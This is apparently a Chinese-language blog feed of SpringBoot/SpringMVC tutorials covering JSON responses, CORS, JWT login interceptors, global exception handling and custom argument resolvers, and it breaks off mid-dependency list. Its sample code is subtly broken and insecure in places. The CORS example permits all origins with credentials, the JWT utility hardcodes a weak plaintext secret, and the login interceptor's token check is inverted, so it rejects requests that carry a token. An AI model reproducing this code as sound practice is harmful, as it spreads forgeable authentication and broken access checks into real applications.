<h5 id="4-4-2-2-使用"><a href="#4-4-2-2-使用" class="headerlink" title="4.4.2.2 使用"></a>4.4.2.2 使用</h5><p>​    只要把要转换的数据直接作为方法的返回值返回即可。SpringMVC会帮我们把返回值转换成json。具体代码请参考范例。</p>
<h4 id="4-4-3-范例"><a href="#4-4-3-范例" class="headerlink" title="4.4.3 范例"></a>4.4.3 范例</h4><h5 id="范例一-4"><a href="#范例一-4" class="headerlink" title="范例一"></a>范例一</h5><p>​    要求定义个RestFul风格的接口，该接口可以用来根据id查询用户。请求路径要求为  /response/user  ，请求方式要求为GET。</p>
<p>​    而请求参数id要写在请求路径上，例如   /response/user/1   这里的1就是id。</p>
<p>​    要求获取参数id,去查询对应id的用户信息（模拟查询即可，可以选择直接new一个User对象），并且转换成json响应到响应体中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/response&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResponseController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/user/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findById</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User(id, <span class="string">&quot;三更草堂&quot;</span>, <span class="number">15</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-5-跨域请求"><a href="#4-5-跨域请求" class="headerlink" title="4.5 跨域请求"></a>4.5 跨域请求</h3><h4 id="4-5-1-什么是跨域"><a href="#4-5-1-什么是跨域" class="headerlink" title="4.5.1 什么是跨域"></a>4.5.1 什么是跨域</h4><p>​    浏览器出于安全的考虑，使用 XMLHttpRequest对象发起 HTTP请求时必须遵守同源策略，否则就是跨域的HTTP请求，默认情况下是被禁止的。 同源策略要求源相同才能正常进行通信，即协议、域名、端口号都完全一致。 </p>
<h4 id="4-5-2-CORS解决跨域"><a href="#4-5-2-CORS解决跨域" class="headerlink" title="4.5.2 CORS解决跨域"></a>4.5.2 CORS解决跨域</h4><p>​    CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing），允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。</p>
<p>​    它通过服务器增加一个特殊的Header[Access-Control-Allow-Origin]来告诉客户端跨域的限制，如果浏览器支持CORS、并且判断Origin通过的话，就会允许XMLHttpRequest发起跨域请求。</p>
<p>​    </p>
<h4 id="4-5-3-SpringBoot使用CORS解决跨域"><a href="#4-5-3-SpringBoot使用CORS解决跨域" class="headerlink" title="4.5.3 SpringBoot使用CORS解决跨域"></a>4.5.3 SpringBoot使用CORS解决跨域</h4><h5 id="1-使用-CrossOrigin"><a href="#1-使用-CrossOrigin" class="headerlink" title="1.使用@CrossOrigin"></a>1.使用@CrossOrigin</h5><p>可以在支持跨域的方法上或者是Controller上加上@CrossOrigin注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserServcie userServcie;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findAll&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseResult <span class="title">findAll</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//调用service查询数据 ，进行返回</span></span><br><span class="line">        List&lt;User&gt; users = userServcie.findAll();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ResponseResult(<span class="number">200</span>,users);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="2-使用-WebMvcConfigurer-的-addCorsMappings-方法配置CorsInterceptor"><a href="#2-使用-WebMvcConfigurer-的-addCorsMappings-方法配置CorsInterceptor" class="headerlink" title="2.使用 WebMvcConfigurer 的 addCorsMappings 方法配置CorsInterceptor"></a>2.使用 WebMvcConfigurer 的 addCorsMappings 方法配置CorsInterceptor</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> </span>&#123;</span><br><span class="line">      <span class="comment">// 设置允许跨域的路径</span></span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                <span class="comment">// 设置允许跨域请求的域名</span></span><br><span class="line">                .allowedOriginPatterns(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                <span class="comment">// 是否允许cookie</span></span><br><span class="line">                .allowCredentials(<span class="keyword">true</span>)</span><br><span class="line">                <span class="comment">// 设置允许的请求方式</span></span><br><span class="line">                .allowedMethods(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;PUT&quot;</span>)</span><br><span class="line">                <span class="comment">// 设置允许的header属性</span></span><br><span class="line">                .allowedHeaders(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                <span class="comment">// 跨域允许时间</span></span><br><span class="line">                .maxAge(<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="4-6-拦截器"><a href="#4-6-拦截器" class="headerlink" title="4.6 拦截器"></a>4.6 拦截器</h3><h4 id="4-6-0-登录案例"><a href="#4-6-0-登录案例" class="headerlink" title="4.6.0 登录案例"></a>4.6.0 登录案例</h4><h5 id="4-6-0-1-思路分析"><a href="#4-6-0-1-思路分析" class="headerlink" title="4.6.0.1 思路分析"></a>4.6.0.1 思路分析</h5><p>​        在前后端分离的场景中，很多时候会采用token的方案进行登录校验。</p>
<p>​        登录成功时，后端会根据一些用户信息生成一个token字符串返回给前端。</p>
<p>​        前端会存储这个token。以后前端发起请求时如果有token就会把token放在请求头中发送给后端。</p>
<p>​        后端接口就可以获取请求头中的token信息进行解析，如果解析不成功说明token超时了或者不是正确的token，相当于是未登录状态。</p>
<p>​        如果解析成功，说明前端是已经登录过的。</p>
<h5 id="4-6-0-2-Token生成方案-JWT"><a href="#4-6-0-2-Token生成方案-JWT" class="headerlink" title="4.6.0.2 Token生成方案-JWT"></a>4.6.0.2 Token生成方案-JWT</h5><p>​        本案例采用目前企业中运用比较多的JWT来生成token。</p>
<p>​        使用时先引入相关依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>新建utils包,下面新建JwtUtil类</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220206224426968.png" alt="image-20220206224426968">        </p>
<p>然后可以使用下面的工具类来生成和解析token,因为是静态方法,直接调用即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.JwtBuilder;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JWT工具类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//有效期为</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Long JWT_TTL = <span class="number">60</span> * <span class="number">60</span> *<span class="number">1000L</span>;<span class="comment">// 60 * 60 *1000  一个小时</span></span><br><span class="line">    <span class="comment">//设置秘钥明文</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String JWT_KEY = <span class="string">&quot;sangeng&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subject</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ttlMillis</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">createJWT</span><span class="params">(String id, String subject, Long ttlMillis)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        SignatureAlgorithm signatureAlgorithm = SignatureAlgorithm.HS256;</span><br><span class="line">        <span class="keyword">long</span> nowMillis = System.currentTimeMillis();</span><br><span class="line">        Date now = <span class="keyword">new</span> Date(nowMillis);</span><br><span class="line">        <span class="keyword">if</span>(ttlMillis==<span class="keyword">null</span>)&#123;</span><br><span class="line">            ttlMillis=JwtUtil.JWT_TTL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> expMillis = nowMillis + ttlMillis;</span><br><span class="line">        Date expDate = <span class="keyword">new</span> Date(expMillis);</span><br><span class="line">        SecretKey secretKey = generalKey();</span><br><span class="line"></span><br><span class="line">        JwtBuilder builder = Jwts.builder()</span><br><span class="line">                .setId(id)              <span class="comment">//唯一的ID</span></span><br><span class="line">                .setSubject(subject)   <span class="comment">// 主题  可以是JSON数据</span></span><br><span class="line">                .setIssuer(<span class="string">&quot;sg&quot;</span>)     <span class="comment">// 签发者</span></span><br><span class="line">                .setIssuedAt(now)      <span class="comment">// 签发时间</span></span><br><span class="line">                .signWith(signatureAlgorithm, secretKey) <span class="comment">//使用HS256对称加密算法签名, 第二个参数为秘钥</span></span><br><span class="line">                .setExpiration(expDate);<span class="comment">// 设置过期时间</span></span><br><span class="line">        <span class="keyword">return</span> builder.compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成加密后的秘钥 secretKey</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SecretKey <span class="title">generalKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] encodedKey = Base64.getDecoder().decode(JwtUtil.JWT_KEY);</span><br><span class="line">        SecretKey key = <span class="keyword">new</span> SecretKeySpec(encodedKey, <span class="number">0</span>, encodedKey.length, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jwt</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Claims <span class="title">parseJWT</span><span class="params">(String jwt)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SecretKey secretKey = generalKey();</span><br><span class="line">        <span class="keyword">return</span> Jwts.parser()</span><br><span class="line">                .setSigningKey(secretKey)</span><br><span class="line">                .parseClaimsJws(jwt)</span><br><span class="line">                .getBody();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="编写拦截器"><a href="#编写拦截器" class="headerlink" title="编写拦截器"></a>编写拦截器</h4><p>以token拦截器为例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取请求头中的token</span></span><br><span class="line">        String token = request.getHeader(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(StringUtils.hasText(token))&#123;</span><br><span class="line"></span><br><span class="line">            response.sendError(HttpServletResponse.SC_UNAUTHORIZED);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Claims claims = JwtUtil.parseJWT(token);</span><br><span class="line">            String subject=claims.getSubject();</span><br><span class="line">            System.out.println(subject);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            response.sendError(HttpServletResponse.SC_UNAUTHORIZED);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//解析token,判断是否成功</span></span><br><span class="line">        <span class="comment">//如果解析过程没有异常,说明是已登录状态</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="配置拦截器"><a href="#配置拦截器" class="headerlink" title="配置拦截器"></a>配置拦截器</h4><p>在config包下新建拦截器配置类</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220206235455580.png" alt="image-20220206235455580"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterceptorConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> LoginInterceptor loginInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addInterceptor(loginInterceptor)</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">                <span class="comment">//.excludePathPatterns();//配置排除路径</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="uuid工具类"><a href="#uuid工具类" class="headerlink" title="uuid工具类"></a>uuid工具类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span><span class="comment">//添加到Spring容器中</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UUIDUtil</span> </span>&#123;</span><br><span class="line">    <span class="comment">//生成一个32位的uuid</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getUUID32</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> UUID.randomUUID().toString().replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>).toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//生成指定数量的uuid</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String[] getUUID(<span class="keyword">int</span> num)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(num&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] uuidArray=<span class="keyword">new</span> String[num];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;uuidArray.length;i++)&#123;</span><br><span class="line">            uuidArray[i]=getUUID32();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uuidArray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="4-7-异常统一处理"><a href="#4-7-异常统一处理" class="headerlink" title="4.7 异常统一处理"></a>4.7 异常统一处理</h3><h4 id="①创建类加上-ControllerAdvice注解进行标识"><a href="#①创建类加上-ControllerAdvice注解进行标识" class="headerlink" title="①创建类加上@ControllerAdvice注解进行标识"></a>①创建类加上@ControllerAdvice注解进行标识</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyControllerAdvice</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="②定义异常处理方法"><a href="#②定义异常处理方法" class="headerlink" title="②定义异常处理方法"></a>②定义异常处理方法</h4><p>​    定义异常处理方法，使用**@ExceptionHandler**标识可以处理的异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyControllerAdvice</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler(RuntimeException.class)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseResult <span class="title">handlerException</span><span class="params">(Exception e)</span></span>&#123;</span><br><span class="line">        <span class="comment">//获取异常信息，存放如ResponseResult的msg属性</span></span><br><span class="line">        String message = e.getMessage();</span><br><span class="line">        ResponseResult result = <span class="keyword">new</span> ResponseResult(<span class="number">300</span>,message);</span><br><span class="line">        <span class="comment">//把ResponseResult作为返回值返回，要求到时候转换成json存入响应体中</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="4-8-获取web原生对象"><a href="#4-8-获取web原生对象" class="headerlink" title="4.8 获取web原生对象"></a>4.8 获取web原生对象</h3><p>​    我们之前在web阶段我们经常要使用到request对象，response，session对象等。我们也可以通过SpringMVC获取到这些对象。（不过在MVC中我们很少获取这些对象，因为有更简便的方式，避免了我们使用这些原生对象相对繁琐的API。）</p>
<p>​    我们只需要在方法上添加对应类型的参数即可，但是注意数据类型不要写错了，SpringMVC会把我们需要的对象传给我们的形参。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/getRequestAndResponse&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseResult <span class="title">getRequestAndResponse</span><span class="params">(HttpServletRequest request, HttpServletResponse response, HttpSession session)</span></span>&#123;</span><br><span class="line">        System.out.println(request);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ResponseResult(<span class="number">200</span>,<span class="string">&quot;成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-9-自定义参数解析"><a href="#4-9-自定义参数解析" class="headerlink" title="4.9 自定义参数解析"></a>4.9 自定义参数解析</h3><p>​    如果我们想实现像获取请求体中的数据那样，在Handler方法的参数上增加一个@RepuestBody注解就可以获取到对应的数据的话。</p>
<p>​    可以使用HandlerMethodArgumentResolver来实现自定义的参数解析。</p>
<p>①定义用来标识的注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.PARAMETER)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> CurrentUserId &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>②创建类实现HandlerMethodArgumentResolver接口并重写其中的方法</p>
<p><strong>注意加上@Component注解注入Spring容器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserIdArgumentResolver</span> <span class="keyword">implements</span> <span class="title">HandlerMethodArgumentResolver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断方法参数使用能使用当前的参数解析器进行解析</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">supportsParameter</span><span class="params">(MethodParameter parameter)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如果方法参数有加上CurrentUserId注解，就能把被我们的解析器解析</span></span><br><span class="line">        <span class="keyword">return</span> parameter.hasParameterAnnotation(CurrentUserId.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//进行参数解析的方法，可以在方法中获取对应的数据，然后把数据作为返回值返回。方法的返回值就会赋值给对应的方法参数</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">resolveArgument</span><span class="params">(MethodParameter parameter, ModelAndViewContainer mavContainer, NativeWebRequest webRequest, WebDataBinderFactory binderFactory)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取请求头中的token</span></span><br><span class="line">        String token = webRequest.getHeader(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(StringUtils.hasText(token))&#123;</span><br><span class="line">            <span class="comment">//解析token，获取userId</span></span><br><span class="line">            Claims claims = JwtUtil.parseJWT(token);</span><br><span class="line">            String userId = claims.getSubject();</span><br><span class="line">            <span class="comment">//返回结果</span></span><br><span class="line">            <span class="keyword">return</span> userId;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>③配置参数解析器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArgumentResolverConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserIdArgumentResolver userIdArgumentResolver;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addArgumentResolvers</span><span class="params">(List&lt;HandlerMethodArgumentResolver&gt; resolvers)</span> </span>&#123;</span><br><span class="line">        resolvers.add(userIdArgumentResolver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>④测试</p>
<p>在需要获取UserId的方法中增加对应的方法参数然后使用@CurrentUserId进行标识即可获取到数据,这个非常好用,每次只需要添加注解就能获取token中的值并赋值给其后面的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="comment">//@CrossOrigin</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserServcie userServcie;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findAll&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseResult <span class="title">findAll</span><span class="params">(<span class="meta">@CurrentUserId</span> String userId)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(userId);</span><br><span class="line">        <span class="comment">//调用service查询数据 ，进行返回s</span></span><br><span class="line">        List&lt;User&gt; users = userServcie.findAll();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ResponseResult(<span class="number">200</span>,users);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMVC入门</title>
    <url>/2022/01/28/SpringMVC%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="SpringMVC入门学习"><a href="#SpringMVC入门学习" class="headerlink" title="SpringMVC入门学习"></a>SpringMVC入门学习<span id="more"></span></h1><h3 id="SpringMVC开发步骤"><a href="#SpringMVC开发步骤" class="headerlink" title="SpringMVC开发步骤"></a>SpringMVC开发步骤</h3><p>在maven中导入需要的依赖(环境是tomcat9)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--springMvc依赖,和spring-web版本号需要保持一致--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--spring-context依赖,和上面版本保持一致--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span 